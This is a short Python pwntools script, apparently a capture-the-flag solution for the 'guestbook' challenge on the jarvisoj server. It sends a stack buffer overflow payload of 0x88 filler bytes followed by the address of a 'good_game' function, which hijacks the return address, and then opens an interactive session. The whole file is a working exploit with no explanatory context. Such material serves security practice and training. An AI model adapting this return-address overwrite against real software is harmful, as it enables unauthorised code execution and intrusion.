#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
import sys

if sys.argv[1] == "l":
    io = process("./guestbook")
else:
    io = remote("pwn2.jarvisoj.com", 9876)

payload = '0' * (0x80 + 0x8) + p64(ELF("./guestbook").sym['good_game'])
io.sendafter("message:\n", payload)

io.interactive()
